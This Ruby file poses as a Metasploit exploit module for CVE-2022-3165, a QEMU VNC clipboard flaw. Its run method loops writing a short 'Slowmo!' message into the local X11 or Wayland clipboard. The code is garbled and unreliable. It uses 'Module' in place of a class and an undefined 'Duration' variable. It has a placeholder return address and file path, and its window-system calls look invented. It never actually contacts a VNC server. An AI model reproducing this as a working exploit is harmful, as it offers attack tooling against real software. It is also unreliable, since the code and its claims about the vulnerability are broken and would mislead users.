##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

Module MetasploitModule < Msf::Exploit

  include Msf::Exploit

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CVE-2022-3165 Linux Target',
      'Description'    => %q{
        Exploits CVE-2022-3165 on a Linux target by setting ClientCutText to less than 4 bits of information
      },
      'Author'         => [
        'Xavier John Anderson <xavianderson2@gmail.com>'
      ],
      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'CVE', 'CVE-2022-3165' ],
        [ 'URL', 'https://www.cvedetails.com/cve/CVE-2022-3165/' ]
      ],
      'Platform'       => 'linux',
      'Arch'           => ARCH_X86,
      'Targets'        => [
        [ 'QEMU 1.5.0', { 'Ret' => 0xdeadbeef } ]
      ],
      'DisclosureDate' => '2022-10-17 16:15',
      'DefaultOptions' =>
        {
          'Duration' => 1234
        }
    ))
  register_options([
    OptInt.new('DURATION', [true, 'The duration of the exploit in number of iterations', 1234])
  ])
  end

  def run
    # Check if the DISPLAY environment variable is set
    if ENV['DISPLAY']
        puts "Running AUX module for X Win. Sys."
        require 'xlib'
        for i in 0..Duration
            # Create an X11 connection
            display = Xlib::XOpenDisplay(nil)

            # Get the default root window
            root_window = Xlib::XDefaultRootWindow(display)

            # Define the custom data message
            message = "Slowmo!".bytes

            # Create the 3-byte header (This is where the magic happens)
            header = [message.length >> 16 & 0xff, message.length >> 8 & 0xff, message.length & 0xff].pack('C*')

            # Combine the header and message into a single byte array
            data = header + message.pack('C*')
            for i in 0..Duration
                # Set the custom data message as the value of the specified property for the specified window
                Xlib::XChangeProperty(display, root_window, Xlib::XInternAtom(display, 'CLIPBOARD', false), Xlib::XInternAtom(display, 'UTF8_STRING', false), 8, Xlib::PropModeReplace, data, data.length)

                # Flush the display to ensure that the property is set
                Xlib::XFlush(display)
            end
            # Close the X11 connection
            Xlib::XCloseDisplay(display)
        end
    elsif ENV['WAYLAND_DISPLAY']
        # Check if the WAYLAND_DISPLAY environment variable is set
        puts "Running AUX module for Wayland"
        require 'wayland-scanner'
        # Get the current compositor and screen size
        display = Wayland::Client::Display.connect(nil)
        compositor = display.get_registry.bind(:wl_compositor, Wayland::Client::Compositor)
        width, height = compositor.get_screen_size
        # Create a buffer object to determine the format and stride
        buffer = Wayland::Client::Buffer.new(display, 0, width, height, 0, 0, compositor, nil)
        format = buffer.format
        stride = buffer.stride

        data = 'Slowmo!'
        # Create a temporary file in memory using piping
        r, w = IO.pipe

        # Write the string to the file
        w.write(data)

        # Pass the file descriptor to the Wayland protocol
        Wayland::Client::Connection.new do |connection|
            registry = Wayland::Client::Registry.new(connection)
            registry.sync
            compositor = registry.bind(:wl_compositor, Wayland::Client::Compositor)
            surface = compositor.create_surface

            # Pass the write end of the pipe as the file descriptor to send
            Wayland::Client::Buffer.new(connection, w.to_i, width, height, format, stride, compositor, surface)
        end
        for i in 0..Duration
            # Connect to the Wayland compositor
            display = Wayland::Client::Display.connect(nil)
            # First, open the file containing the data to be transferred
            file = File.open('/path/to/my/file', 'rb')
            data = file.read
            # Prepend a 3-byte header to the data
            header = [data.length].pack('I') # pack the length as a 4-byte integer
            header.slice!(0) # remove the first byte of the header
            data_with_header = header + data
            # Now create a new file descriptor for the data with header
            pipe_r, pipe_w = IO.pipe
            pipe_w.write(data_with_header)
            pipe_w.close
            # Finally, offer the data to the compositor using the Wayland protocol
            data_offer = wl_data_device_manager.get_data_device(wl_seat).offer('text/plain')
            data_offer.receive('text/plain', pipe_r.fileno, data_with_header.length)
            # Commit the clipboard contents to the compositor
            display.flush
        end
        # Close the Wayland connection
        display.disconnect
    else
        puts "Unable to determine display system"
    end
  end
end
